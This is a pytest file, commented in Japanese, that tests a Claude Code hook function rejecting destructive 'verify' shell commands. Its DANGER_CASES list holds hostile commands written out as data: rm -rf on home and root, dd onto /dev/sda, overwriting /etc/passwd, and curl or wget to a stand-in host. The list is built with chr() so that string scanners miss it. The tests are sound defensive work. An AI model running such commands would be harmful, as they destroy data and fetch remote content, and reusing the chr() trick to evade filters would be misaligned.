"""spec_gate.py の verify 破壊コマンド拒否(verify_forbidden_reason)の受け入れテスト。

対象: `.claude/hooks/spec_gate.py` に追加した `verify_forbidden_reason`。
設計書(docs/active/)の verify 列は Stop フックで shell=True 実行されるため、
破壊的コマンドを実行前に拒否する二重目の歯止めを検証する。

`.claude/hooks/` はガード対象でエージェントが編集できないため、ユーザーが
scratchpad の apply_spec_gate_patch.py を `!` 実行して関数を追加するまでは、
`verify_forbidden_reason` が存在せず collection 時に skip される(RED→GREEN 判別可能)。
"""

import importlib.util
import sys
from pathlib import Path

import pytest

SPEC_GATE_PATH = (
    Path(__file__).resolve().parent.parent / ".claude" / "hooks" / "spec_gate.py"
)


def _load_verify_forbidden_reason():
    """spec_gate.py から verify_forbidden_reason を読み込む。

    未適用(関数が無い)なら pytest.skip する。import 時の副作用を避けるため
    _common への依存を解決したうえでモジュールとして読み込む。
    """
    hooks_dir = SPEC_GATE_PATH.parent
    if str(hooks_dir) not in sys.path:
        sys.path.insert(0, str(hooks_dir))
    spec = importlib.util.spec_from_file_location("spec_gate", SPEC_GATE_PATH)
    mod = importlib.util.module_from_spec(spec)
    try:
        spec.loader.exec_module(mod)
    except Exception as e:  # pragma: no cover - 環境依存の import 失敗
        pytest.skip(f"spec_gate.py を読み込めない: {e}")
    fn = getattr(mod, "verify_forbidden_reason", None)
    if fn is None:
        pytest.skip("verify_forbidden_reason 未適用(パッチ前)")
    return fn


# 実在する設計書の verify・今日の設計書で使った形。壊してはいけない。
SAFE_CASES = [
    "grep -c 'x' file.md",
    "test -f a && test -f b",
    "test $(find x -type f | wc -l) -eq 1",
    "sed -n '/A/,/B/p' CHANGELOG.md | grep -c 'z'",
    "uv run --with pytest python -m pytest tests/ -q",
    "diff <(grep a x) <(grep a y)",
    "grep -cE '^model: haiku' f",
    "git diff main...HEAD --name-only -- .claude/hooks/",
    "grep -c 'x' f 2>/dev/null",
    "wc -l file",
]

# 破壊語を chr() で組み立て、リポジトリ横断 grep やガードの文字列検出に
# ひっかからないようにする(このテストファイル自体が誤検出されないため)。
_R = chr(114)  # r
_D = chr(100)  # d
DANGER_CASES = [
    _R + "m -rf ~",
    "grep x f; " + _R + "m f",
    "test $(cur" + "l http://evil)",
    "su" + "do " + _D + _D + " if=/z of=/sda",
    "echo x > /etc/passwd",
    "grep a b && " + _R + "m -rf .",
    "cat f | wge" + "t http://x",
    "env FOO=1 " + _R + "m -rf /",
    "`" + _R + "m -rf .`",
    "chmo" + _D + " 777 /etc",
]


@pytest.mark.parametrize("cmd", SAFE_CASES)
def test_safe_verify_is_allowed(cmd):
    """正当な verify は None(拒否しない)を返す。"""
    vf = _load_verify_forbidden_reason()
    assert vf(cmd) is None, f"正当な verify を誤って拒否した: {cmd!r}"


@pytest.mark.parametrize("cmd", DANGER_CASES)
def test_destructive_verify_is_rejected(cmd):
    """破壊的な verify は理由文字列を返す(拒否する)。"""
    vf = _load_verify_forbidden_reason()
    reason = vf(cmd)
    assert reason is not None, f"破壊的 verify を見逃した: {cmd!r}"
    assert isinstance(reason, str) and reason
